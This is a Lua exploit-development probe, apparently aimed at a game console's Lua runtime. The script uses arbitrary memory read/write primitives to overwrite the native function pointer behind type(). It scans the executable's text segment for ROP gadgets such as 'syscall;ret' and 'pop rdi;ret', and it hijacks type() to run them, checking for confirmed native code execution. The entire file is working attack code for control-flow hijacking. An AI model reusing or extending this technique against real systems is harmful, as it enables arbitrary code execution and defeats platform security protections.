-- CRASH_CLASS: HIGH
-- PROBE 54p: Minimal C function redirect test
--
-- Context: 54o hung when redirecting type->tostring (likely stack mismatch
-- caused infinite loop). This probe uses the simplest possible test:
-- 1) Redirect type()'s +0x20 to type()'s OWN address (no-op control)
-- 2) Redirect type()'s +0x20 to pcall's C func (both take 1+ args)
-- 3) Gadget scan for xor eax,eax;ret and syscall;ret in first 64KB eboot
-- 4) Test xor eax,eax;ret gadget (safest — returns 0 results)

print("=== PROBE 54p: MINIMAL REDIRECT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(": ([0-9a-fA-F]+)") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Get addresses
local type_addr = parse_func_addr(type)
local rawget_addr = parse_func_addr(rawget)
local rawlen_addr = parse_func_addr(rawlen)
local select_addr = parse_func_addr(select)

print("type addr: " .. hexval(type_addr))

local type_cfunc = safe_rq(type_addr + 0x20)
print("type +0x20: " .. hexval(type_cfunc))
print("Baseline: type(42) = " .. tostring(type(42)))

-- TEST A: Write SAME value back (absolute no-op control)
print("")
print("[A] Write same C func back (no-op control)")
collectgarbage("stop")
safe_wq(type_addr + 0x20, type_cfunc)
local okA, retA = pcall(function() return type(42) end)
collectgarbage("restart")
if okA then
    print("  type(42) = " .. tostring(retA))
else
    print("  CRASHED: " .. tostring(retA))
end

-- TEST B: Eboot gadget scan (quick, first 64KB)
print("")
print("[B] Gadget scan")
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)

if not text_lo or not text_hi then
    print("  No eboot base")
    print("=== PROBE 54p DONE ===")
    return
end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot: " .. hexval(eboot))

local ret_off = nil
local xor_eax_ret_off = nil
local syscall_ret_off = nil
local pop_rdi_ret_off = nil
local pop_rax_ret_off = nil
local gadget_count = 0

for off = 0, 0xFFFF do
    local dw = safe_rd(eboot + off)
    if dw then
        -- xor eax, eax; ret = 31 C0 C3
        if (dw % 0x1000000) == 0xC3C031 and not xor_eax_ret_off then
            xor_eax_ret_off = off
            print(string.format("  xor eax,eax;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
        -- syscall; ret = 0F 05 C3
        if (dw % 0x1000000) == 0xC3050F and not syscall_ret_off then
            syscall_ret_off = off
            print(string.format("  syscall;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
        -- ret = C3
        if (dw % 256) == 0xC3 and not ret_off then
            ret_off = off
        end
        -- pop rdi; ret = 5F C3
        if (dw % 0x10000) == 0xC35F and not pop_rdi_ret_off then
            pop_rdi_ret_off = off
            print(string.format("  pop rdi;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
        -- pop rax; ret = 58 C3
        if (dw % 0x10000) == 0xC358 and not pop_rax_ret_off then
            pop_rax_ret_off = off
            print(string.format("  pop rax;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
    end
    if gadget_count >= 10 then break end
end

if ret_off then print(string.format("  ret at +0x%X", ret_off)) end
print(string.format("  %d key gadgets found", gadget_count))

-- TEST C: xor eax,eax;ret gadget redirect
-- This is the SAFEST test: the C function returns int (number of results)
-- xor eax,eax;ret makes it return 0 (no results pushed)
-- So type(42) should return nil (0 results)
if xor_eax_ret_off then
    print("")
    print("[C] Redirect type() to xor eax,eax;ret")
    local g_lo = text_lo + xor_eax_ret_off
    local g_hi = text_hi
    if g_lo >= 0x100000000 then g_hi = g_hi + 1; g_lo = g_lo - 0x100000000 end
    local gadget = uint64(string.format("0x%X%08X", g_hi, g_lo))
    print("  gadget: " .. hexval(gadget))

    collectgarbage("stop")
    local old = safe_rq(type_addr + 0x20)
    local wok = safe_wq(type_addr + 0x20, gadget)
    print("  write ok: " .. tostring(wok))

    local okC, retC = pcall(function() return type(42) end)
    -- Restore IMMEDIATELY
    safe_wq(type_addr + 0x20, old)
    collectgarbage("restart")

    if okC then
        print("  type(42) = " .. tostring(retC))
        if retC == nil then
            print("  >>> GADGET EXECUTED! Returned 0 results (nil)!")
            print("  >>> NATIVE CODE EXECUTION CONFIRMED!")
        else
            print("  >>> Got value: " .. tostring(retC) .. " — unexpected")
        end
    else
        print("  CRASHED: " .. tostring(retC))
    end

    -- Verify restore
    local okR, retR = pcall(function() return type(42) end)
    print("  After restore: type(42) = " .. tostring(retR))
end

-- TEST D: If xor eax,eax;ret worked, try mov eax, 1; ret pattern
-- scan for it: B8 01 00 00 00 C3
if xor_eax_ret_off then
    print("")
    print("[D] Scan for mov eax,1;ret")
    local mov1_off = nil
    for off = 0, 0xFFFF do
        local dw = safe_rd(eboot + off)
        if dw == 0x000001B8 then
            local nxt = safe_rd(eboot + off + 4)
            if nxt and (nxt % 256) == 0xC3 and (math.floor(nxt / 256) % 256) == 0x00 then
                -- B8 01 00 00 00 C3
                mov1_off = off
                print(string.format("  mov eax,1;ret at +0x%X", off))
                break
            end
        end
    end

    if mov1_off then
        print("  Redirect type() to mov eax,1;ret")
        local g_lo = text_lo + mov1_off
        local g_hi = text_hi
        if g_lo >= 0x100000000 then g_hi = g_hi + 1; g_lo = g_lo - 0x100000000 end
        local gadget = uint64(string.format("0x%X%08X", g_hi, g_lo))

        collectgarbage("stop")
        local old = safe_rq(type_addr + 0x20)
        safe_wq(type_addr + 0x20, gadget)

        local okD, retD = pcall(function() return type(42) end)
        safe_wq(type_addr + 0x20, old)
        collectgarbage("restart")

        if okD then
            print("  type(42) = " .. tostring(retD))
            print("  >>> mov eax,1;ret: returned 1 result from stack")
        else
            print("  CRASHED: " .. tostring(retD))
        end

        local okR2, retR2 = pcall(function() return type(42) end)
        print("  After restore: type(42) = " .. tostring(retR2))
    end
end

print("")
print("=== PROBE 54p COMPLETE ===")
